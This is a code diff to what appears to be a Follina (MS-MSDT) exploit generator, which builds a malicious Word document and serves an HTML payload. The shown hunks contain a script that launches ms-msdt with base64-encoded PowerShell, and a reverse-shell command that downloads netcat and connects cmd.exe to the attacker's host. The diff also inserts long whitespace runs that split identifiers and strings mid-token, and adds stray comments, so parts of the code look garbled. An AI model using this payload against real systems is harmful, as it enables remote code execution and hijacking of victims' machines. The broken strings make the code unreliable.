@@ -59,6 +59,10 @@ def main(args):
 
     # Parse the supplied interface
     # This is done so the maldoc knows what to reach out to.
+
+    # >>> netifaces.ifaddresses("eth0")[netifaces.AF_INET][0]
+    # {'addr': '10.2.3.40', 'netmask': '255.255.255.0', 'broadcast': '10.2.3.255'}
+
     try:
         serve_host = ipaddress.IPv4Address(args.interface)
     except ipaddress.AddressValueError:
@@ -73,6 +77,8 @@ def main(args):
             exit()
 
     # Copy the Microsoft Word skeleton into a temporary staging folder
+    # Staging dir => '/tmp/xp5zbnep' + "doc"
+
     doc_suffix = "doc"
     staging_dir = os.path.join(
         tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
@@ -108,13 +114,13 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true                                                                                                                               -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
 
     # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
-    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
+    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForF                                                                                                                              ile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encodi                                                                                                                              ng]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base6                                                                                                                              4_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //                                                                                                                              """
     html_payload += (
         "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
         + "\n</script>"
@@ -123,6 +129,10 @@ def main(args):
     # Create our HTML endpoint
     with open(os.path.join(serve_path, "index.html"), "w") as filp:
         filp.write(html_payload)
+
+    # * mit Positional-Only
+    shutil.copy(args.output, serve_path)
+    print(f"[+] copied {args.output} nach {staging_dir}")
 
     class ReuseTCPServer(socketserver.TCPServer):
         def server_bind(self):
@@ -145,12 +155,19 @@ def main(args):
             else:
                 super().log_request(format, *func_args)
 
+        def do_OPTIONS(self):
+            self.send_response(200)
+            self.send_header("Allow", "GET, POST, HEAD, OPTIONS")
+            self.end_headers()
+
+
     def serve_http():
         with ReuseTCPServer(("", args.port), Handler) as httpd:
             httpd.serve_forever()
 
     # Host the HTTP server on all interfaces
     print(f"[+] serving html payload on :{args.port}")
+    print(f"\n Download file on: http://{serve_host}:{args.port}/{args.output}")
     if args.reverse:
         t = threading.Thread(target=serve_http, args=())
         t.start()
